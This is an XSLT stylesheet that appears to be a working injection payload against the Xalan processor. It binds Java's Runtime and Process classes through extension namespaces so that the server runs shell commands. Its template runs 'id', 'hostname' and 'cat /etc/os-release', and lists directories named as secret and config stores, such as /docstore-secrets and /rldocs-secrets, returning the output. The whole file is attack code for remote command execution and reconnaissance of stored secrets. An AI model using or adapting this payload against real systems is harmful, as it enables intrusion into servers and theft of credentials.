<?xml version="1.0" encoding="UTF-8"?>
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:proc="http://xml.apache.org/xalan/java/java.lang.Process"
    xmlns:is="http://xml.apache.org/xalan/java/java.io.InputStream"
    xmlns:str="http://xml.apache.org/xalan/java/java.lang.String">
  <xsl:output method="text"/>
  <xsl:template match="/">
    <out><xsl:value-of
      select="str:new(is:readAllBytes(proc:getInputStream(rt:exec(rt:getRuntime(),'id'))))"/></out>
    <out><xsl:value-of
      select="str:new(is:readAllBytes(proc:getInputStream(rt:exec(rt:getRuntime(),'hostname'))))"/></out>
    <out><xsl:value-of
      select="str:new(is:readAllBytes(proc:getInputStream(rt:exec(rt:getRuntime(),'ls -la / /resourcelink-secrets /docstore-secrets /clamav-secrets /rldocs-config /rldocs-secrets'))))"/></out>
    <out><xsl:value-of
      select="str:new(is:readAllBytes(proc:getInputStream(rt:exec(rt:getRuntime(),'cat /etc/hostname /etc/os-release'))))"/></out>
  </xsl:template>
</xsl:stylesheet>
